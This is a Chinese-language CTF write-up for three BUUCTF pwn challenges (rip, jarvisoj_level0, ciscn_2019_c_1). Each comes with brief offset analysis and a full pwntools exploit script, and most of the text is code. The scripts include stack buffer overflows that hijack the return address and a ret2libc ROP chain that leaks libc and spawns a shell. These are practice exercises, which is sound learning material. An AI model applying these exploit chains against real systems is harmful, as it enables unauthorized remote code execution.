# rip
根据IDA加载入main函数声明发现s数组距离`rbp`的距离为F，即为15，这里的运行环境是64位，所以应当将`Caller's rbp`的数据填满，在这里是8位，即可构造payload
```python
from pwn import *
p=remote("node4.buuoj.cn", 25401)
#p=process("./pwn1")
payload=b'a'*15+b'b'*8+p64(0x401186+1)
p.sendline(payload)
p.interactive()
```
# jarvisoj_level0
打开IDA主函数两条命令，很明显可利用漏洞就在`vulnerable_function`函数内，进入后看到buf很明显距离rbp有0x80位，再加上64位机多出来的8位，即覆盖`0x80+0x8`即可覆盖，另外有`callsystem`函数作为漏洞执行入口
```python
from pwn import *
p=remote("node4.buuoj.cn", 27716)
#p=process("./level0")
payload=b'a'*136+p64(0x400596)
#p.sendline(payload)
p.sendlineafter('Hello, World\n',payload)
p.interactive()
```

# ciscn_2019_c_1
```python
from pwn import *
from LibcSearcher import *
p=remote("node4.buuoj.cn", 27706)
#p=process("./ciscn_2019_c_1")
elf=ELF("./ciscn_2019_c_1")
main=0x400b28
rdi=0x400c83
ret=0x4006b9
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
p.sendlineafter('Input your choice!\n', '1')
payload=b'\0'+b'a'*(0x50-1+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
p.sendlineafter('Input your Plaintext to be encrypted\n', payload)
p.recvline()
p.recvline()
puts_addr=u64(p.recvuntil('\n')[:-1].ljust(8, b'\0'))#得到puts函数的地址
libc=LibcSearcher("puts", puts_addr)
libc_base=puts_addr-libc.dump("puts")
sys_addr=libc_base+libc.dump("system")
binsh=libc_base+libc.dump("str_bin_sh")
p.sendlineafter('choice!\n', '1')
payload=b'\0'+b'a'*(0x50-1+8)+p64(ret)+p64(rdi)+p64(binsh)+p64(sys_addr)
#p.sendline(payload)
p.sendlineafter('encrypted\n',payload)
p.interactive()
```
经过暴力循环测试法，测得最终的libc版本为`libc6_2.27-0ubuntu3_amd64`，然后即可打通本poc